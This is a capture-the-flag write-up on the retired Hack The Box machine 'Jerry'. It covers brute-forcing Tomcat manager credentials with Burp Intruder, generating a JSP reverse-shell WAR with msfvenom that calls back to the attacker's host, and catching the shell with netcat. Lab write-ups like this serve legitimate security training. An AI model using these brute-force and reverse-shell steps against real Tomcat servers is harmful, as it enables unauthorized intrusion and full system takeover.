---
layout: post
title: "HTB: Jerry"
---

This is a retired Windows box in the Easy category.<!--more-->
As always, let's begin with the customary nmap scan with 
```bash
sudo nmap -sV -O -F --version-light 10.10.10.95
```
I opted for the light version this time just to see how it works.
<div style="text-align:center"><img src="/assets/Jerry/nmap.webp" alt="Nmap Scan"/></div><br/>

Ah port 8080, the classic port for any web server. It's a Tomcat server running Java Servlet Pages(`.jsp`) which are pretty much antiquated in this day and age but anyway, that's a topic for another day. Let's visit that port and see what we get. We're greeted with a good ol' Tomcat server page with a few different options.

<div style="text-align:center"><img src="/assets/Jerry/default-tomcat.webp" alt="Tomcat server page"/></div><br/>

The manager app looks exciting (it's an app that manages all the aspects of a Tomcat server like deployments, sessions, users and other monitoring). Let's try that but oh dear, seems it's authenticated (as any manager app should rightly be). If you enter any credentials and click `OK` then you'll be greeted with a standard [401 Unauthorized](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/401) page. Alright, so in most HTB's as i've seen till now, in my very inexperienced opinion - passwords and credentials are either cleverly stored within some kind of configuration files or can be bruteforced with wordlists available freely. On doing a cursory google search for Tomcat manager app wordlists, I found this [Apache Tomcat Wordlist](https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown). Let's copy this list into a file called `credentials.txt` and we can then use them in a bit.

<div style="text-align:center"><img src="/assets/Jerry/pass-list.webp" alt="Password list"/></div><br/>

Let's intercept this authentication request that is being sent to the Tomcat server so that we can see which form of authentication is being used. Fire up Burpsuite and head on over to the intercepted request which should look something like this (with some dummy credentials):

<div style="text-align:center"><img src="/assets/Jerry/intercept.webp" alt="Burp Intercept"/></div><br/>

Right off the bat you should notice that the encryption/encoding being used is `Base64`, which is super easy to decode as well. There are 2 main facts which should tell you this: 
1. The authorization header `Basic <your encoded string here>`. More on that [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Authorization#basic).
2. The actual encoding string which ends with two `==`'s. This is a classic sign of a Base64 encoding in **MOST** cases - read [this SO answer](https://stackoverflow.com/a/36571117/11583240) for an understanding as to why.

Right click on the the request and send it to the repeater and intruder. Select the entire encoded string and `Send to decoder`. Next, navigate to the decoder window and select `Decode as plaintext` and you should see the credentials you had sent in your request.

<div style="text-align:center"><img src="/assets/Jerry/decoder.webp" alt="Burp Decoder Result"/></div><br/>

So now we know the encoding being used. Therefore when we bruteforce the credentials in the sniper attack we need to have them encoded in base64. Steps to acheive our goal:
1. Format the `credentials.txt` to match the format being used in the actual request `username:password`.
2. Encode them as base64
3. Use the list in our sniper attack
4. Profit!

### Formatting credentials.txt

The editor I'm using to view and manipulate the file is `gedit` so I will use the native `Find and Replace` feature where in the `Find` section I'll put a `   ` (which is 3 spaces because I want to replace all the spaces with a colon) and in the `Replace with` section I'll add a `:`. 

<div style="text-align:center"><img src="/assets/Jerry/find-and-replace.webp" alt="Gedit find and replace window"/></div><br/>

Hit `Replace All` and your `credentials.txt` should now look like this:

<div style="text-align:center"><img src="/assets/Jerry/edited-password-list.webp" alt="Edited credentials.txt"/></div><br/>

### Encoding as base64

For this very simple operation, it wil be beneficial to use bash to acheive the encoding. It can be done in a single line like this:
```bash
for cred in $(cat credentials.txt);do echo $cred | base64 >> creds.txt;done
```
Notice you won't see any output because whatever you're printing to the console is being piped(with `>>`) into a file names `creds.txt`. I'll leave it upto you to figure out how you can output the lines to standard console ;) Now your `creds.txt` should like like:

<div style="text-align:center"><img src="/assets/Jerry/edited-password-list.webp" alt="Enocoded credentials.txt"/></div><br/>

### Craft and execute the sniper attack

Navigate to the intruder window where you will see your request waiting. 
1. Choose the `Attack type` as `Sniper`.
2. Select the encoded string in the autorization header like below and click on `Add` on the right.

    <div style="text-align:center"><img src="/assets/Jerry/sniper.webp" alt="Sniper configuration.txt"/></div><br/>

3. Go to `Payloads` and add the contents of `creds.txt` that was obtained in the previous section. Alternatively, you could also ask Burp to just read the input from your file. 
4. This one is important - remember to **uncheck** the `Payload Encoding` box. The RFC specification only allows us to use only certain ASCII characters and special characters within our URls, but what if we want something like a space or `==` in our headers/path params? We'd want either the server to decode these at their end or not encode them at all while sending them. From the request we can see that we're not encoding them (if they were encoded they'd be going as `%3D%3D` instead of `==`) so that means we need to ensure the same is happening. You can read more about [URL encoding here](https://www.urlencoder.io/learn/).

5. You can now safely execute the attack. the results would look like this:

<div style="text-align:center"><img src="/assets/Jerry/attack-result.webp" alt="Sniper attack result"/></div><br/>

Clearly, the `200 OK` result is what we need - so you can send that request to the decoder by selecting the string from it and decode it. It should show you this result:

<div style="text-align:center"><img src="/assets/Jerry/decoder-result.webp" alt="Decoder result"/></div><br/>

Brilliant, this was sneaky, maybe we should just have tried the password we saw on the 401 page we saw in the beginning!

Now you can access the manager app by entering those credentials. You will be greeted with a page that looks similar to this:

<div style="text-align:center"><img src="/assets/Jerry/manager-home.webp" alt="Manager homepage"/></div><br/>

Another google search should tell us that this particular version of Tomcat is susceptible to a reverse malicious shell upload. Fire up `msfvenom` and let's generate a WAR (web archive) file with this:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP address> LPORT=<Port you want to open a reverse shell on> -f war > shell.war
```

This command generates a war which we will now upload onto the Tomcat server. Browse to your war file and upload it as shown below. By default, this will generate a new route with the name of your uploaded war , so if your file was `shell.war`, you'll have a new route added to your manager app with the value of `/shell`.

<div style="text-align:center"><img src="/assets/Jerry/select-and-deploy.webp" alt="Deploy the war"/></div><br/>

You can reload the manager app to see your new changes if not immediately visible.

<div style="text-align:center"><img src="/assets/Jerry/shell-path.webp" alt="Shell path"/></div><br/>

Before we go in for the final kill, be sure to open a port to listen on (the same one which you used while generating the `.war` file) with 
```bash
nc -lnvp <Your port here>
```

Now all you need to do is navigate to `/shell` and you should see a shell spawn on your netcat console.

<div style="text-align:center"><img src="/assets/Jerry/root.webp" alt="Gained root"/></div><br/>

Navigate to the desktop for the flags. This box is a little unique in the sense that it has both the flags in the same file - the same can be gleaned from the name ;)

<div style="text-align:center"><img src="/assets/Jerry/flag-location.webp" alt="Flags"/></div><br/>

And there you have it folks, another day and another box rooted!